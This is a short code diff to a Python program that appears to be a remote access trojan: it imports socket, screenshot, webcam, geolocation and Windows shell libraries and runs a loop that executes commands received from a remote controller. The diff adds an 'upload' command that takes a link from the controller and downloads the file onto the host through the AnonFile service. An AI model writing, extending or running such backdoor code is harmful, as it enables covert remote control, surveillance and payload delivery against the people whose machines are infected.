@@ -1,4 +1,3 @@
-from ctypes import WinError
 import socket, random, time, threading, os, pyautogui, geocoder, urllib, json, platform, cv2, winshell, win32com.client
 from turtle import title
 from anonfile import AnonFile
@@ -105,6 +104,12 @@ while True:
              os.remove(filename)
          except:
                 pass           
+ 
+        elif data == 'upload':
+          anon = AnonFile()
+          link = str(client.recv(4096), 'utf-8')
+          print(link)
+          anon.download(link)
 
         elif data == 'cwd':
           try:
